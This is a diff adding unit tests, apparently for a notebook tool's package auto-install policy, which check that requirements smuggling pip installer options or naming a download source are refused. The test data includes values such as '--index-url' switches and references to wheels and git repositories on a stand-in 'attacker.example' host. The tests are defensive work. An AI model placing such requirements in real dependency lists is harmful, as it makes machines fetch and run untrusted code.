@@ -305,6 +305,144 @@ public sealed class AutoInstallPolicyTests
         Assert.AreEqual(0, _requests.Count);
     }
 
+    // --- installer options are not packages ---
+    //
+    // Requirements reach pip and uv as separate arguments, and they come from the notebook: a
+    // declared dependency list or an inline script metadata block, neither of which is necessarily
+    // written by whoever opened the file. A string beginning with a hyphen is an installer switch
+    // rather than a package, and switches decide where packages are fetched from.
+
+    [TestMethod]
+    public async Task ADeclaredRequirementNamingAnInstallerOptionIsRefused()
+    {
+        var service = Build(AutoInstallPolicy.Prompt);
+        var scan = new ImportScan(
+            Array.Empty<ScannedImport>(),
+            new[] { "--index-url=http://127.0.0.1:1/simple", "pandas>=2" });
+
+        await EnsureAsync(service, scan);
+
+        var asked = _requests.Single().Select(r => r.PackageId).ToArray();
+        CollectionAssert.AreEqual(new[] { "pandas>=2" }, asked);
+        StringAssert.Contains(Output, "--index-url=http://127.0.0.1:1/simple");
+        StringAssert.Contains(Output, "installer options");
+    }
+
+    [TestMethod]
+    public async Task AnInstallerOptionIsRefusedUnderAutoWhereNothingWouldAsk()
+    {
+        var service = Build(AutoInstallPolicy.Auto);
+        var scan = new ImportScan(Array.Empty<ScannedImport>(), new[] { "--index-url=http://127.0.0.1:1/simple" });
+
+        var installed = await EnsureAsync(service, scan);
+
+        // Auto installs a declared requirement without asking, which is exactly why the string has
+        // to be a package name before it gets there.
+        Assert.AreEqual(0, installed.Count);
+        Assert.AreEqual(0, _requests.Count);
+        StringAssert.Contains(Output, "installer options");
+    }
+
+    [TestMethod]
+    public async Task ARefusedRequirementIsNotReportedTwice()
+    {
+        var service = Build(AutoInstallPolicy.Auto);
+        var scan = new ImportScan(Array.Empty<ScannedImport>(), new[] { "--find-links=/tmp/wheels" });
+
+        await EnsureAsync(service, scan);
+        await EnsureAsync(service, scan);
+
+        Assert.AreEqual(
+            1,
+            _context.WrittenOutputs.Count(o => o.Content.Contains("installer options")),
+            "a cell that carries one must not say the same thing on every run");
+    }
+
+    [TestMethod]
+    public async Task AMappingToAnInstallerOptionIsRefused()
+    {
+        var map = new Dictionary<string, string> { ["yaml"] = "--index-url=http://127.0.0.1:1/simple" };
+        var service = Build(AutoInstallPolicy.Auto, importMap: map);
+
+        var installed = await EnsureAsync(service, Missing("yaml"));
+
+        // A configured mapping lands in the same argument position a requirement does, and counts
+        // as known, so it would otherwise install without asking.
+        Assert.AreEqual(0, installed.Count);
+        StringAssert.Contains(Output, "installer options");
+    }
+
+    [TestMethod]
+    public async Task AnOrdinaryDeclaredRequirementStillInstallsWithoutAskingUnderAuto()
+    {
+        var service = Build(AutoInstallPolicy.Auto);
+        var scan = new ImportScan(Array.Empty<ScannedImport>(), new[] { "pandas>=2" });
+
+        await EnsureAsync(service, scan);
+
+        // The install itself fails, because the interpreter above does not exist. What matters is
+        // that it was attempted and nothing was asked.
+        Assert.AreEqual(0, _requests.Count);
+        StringAssert.Contains(Output, "Installing pandas>=2");
+    }
+
+    // --- a requirement may not name where it comes from ---
+    //
+    // A switch is not the only way to point the installer somewhere. A direct reference, a version
+    // control reference, a bare URL and a path all name a location instead of a distribution, and a
+    // notebook naming the location is the same decision the hyphen rule exists to prevent.
+
+    [TestMethod]
+    [DataRow("evil @ https://attacker.example/payload.whl", DisplayName = "direct reference")]
+    [DataRow("git+https://attacker.example/evil.git", DisplayName = "version control reference")]
+    [DataRow("https://attacker.example/payload.whl", DisplayName = "bare URL")]
+    [DataRow("/tmp/payload.whl", DisplayName = "absolute path")]
+    [DataRow("./payload.whl", DisplayName = "relative path")]
+    public async Task ADeclaredRequirementNamingASourceIsRefused(string requirement)
+    {
+        var service = Build(AutoInstallPolicy.Auto);
+        var scan = new ImportScan(Array.Empty<ScannedImport>(), new[] { requirement });
+
+        var installed = await EnsureAsync(service, scan);
+
+        // Auto is the case that matters: nothing would have asked, so the string would have chosen
+        // where the code came from on a machine whose owner never saw it.
+        Assert.AreEqual(0, installed.Count);
+        Assert.AreEqual(0, _requests.Count);
+        StringAssert.Contains(Output, "somewhere to install from");
+        Assert.IsFalse(Output.Contains("Installing " + requirement));
+    }
+
+    [TestMethod]
+    [DataRow("pandas>=2", DisplayName = "version specifier")]
+    [DataRow("pandas[performance]>=2,<3", DisplayName = "extras")]
+    [DataRow("pandas>=2; python_version < \"3.12\"", DisplayName = "environment marker")]
+    [DataRow("zope.interface", DisplayName = "dotted name")]
+    public async Task AnOrdinaryRequirementIsNotMistakenForASource(string requirement)
+    {
+        var service = Build(AutoInstallPolicy.Auto);
+        var scan = new ImportScan(Array.Empty<ScannedImport>(), new[] { requirement });
+
+        await EnsureAsync(service, scan);
+
+        // The rule has to leave the whole of the ordinary form alone, markers and all, or it breaks
+        // dependency lists that were never doing anything questionable.
+        Assert.IsFalse(Output.Contains("somewhere to install from"));
+        StringAssert.Contains(Output, "Installing " + requirement);
+    }
+
+    [TestMethod]
+    public async Task AMappingToASourceIsRefused()
+    {
+        var map = new Dictionary<string, string> { ["yaml"] = "git+https://attacker.example/evil.git" };
+        var service = Build(AutoInstallPolicy.Auto, importMap: map);
+
+        var installed = await EnsureAsync(service, Missing("yaml"));
+
+        Assert.AreEqual(0, installed.Count);
+        StringAssert.Contains(Output, "somewhere to install from");
+    }
+
     // --- settings changes ---
 
     [TestMethod]
